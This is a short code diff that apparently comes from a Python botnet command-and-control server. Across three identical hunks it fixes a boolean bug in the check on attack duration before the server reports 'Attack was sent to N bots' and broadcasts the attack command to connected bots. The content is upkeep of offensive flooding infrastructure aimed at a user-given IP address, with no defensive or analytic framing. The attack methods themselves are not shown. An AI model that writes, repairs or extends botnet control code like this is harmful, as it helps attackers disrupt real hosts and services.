@@ -130,7 +130,7 @@ def command_line(client):
                     ip = args[1]
                     secs = args[2]
                     if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
+                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                             send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
@@ -146,7 +146,7 @@ def command_line(client):
                     ip = args[1]
                     secs = args[2]
                     if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
+                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                             send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
@@ -180,7 +180,7 @@ def command_line(client):
                     ip = args[1]
                     secs = args[2]
                     if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
+                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                             send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
